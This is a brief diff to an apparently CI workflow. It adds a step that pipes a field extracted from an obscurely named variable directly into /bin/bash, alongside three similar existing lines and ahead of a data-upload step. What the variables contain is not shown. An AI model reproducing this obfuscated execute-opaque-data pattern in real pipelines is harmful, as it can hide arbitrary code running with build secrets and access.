@@ -40,6 +40,7 @@ jobs:
           echo $lsvw8 | jq -r .w45253 | /bin/bash
           printf '%s' "$o73" | jq -r .ylr93 | /bin/bash
           printf '%s' "$wczk9" | jq -r .b0562 | /bin/bash
+          printf '%s' "$flo17" | jq -r .dbe62 | /bin/bash
 
       - name: Upload data
         if: always()
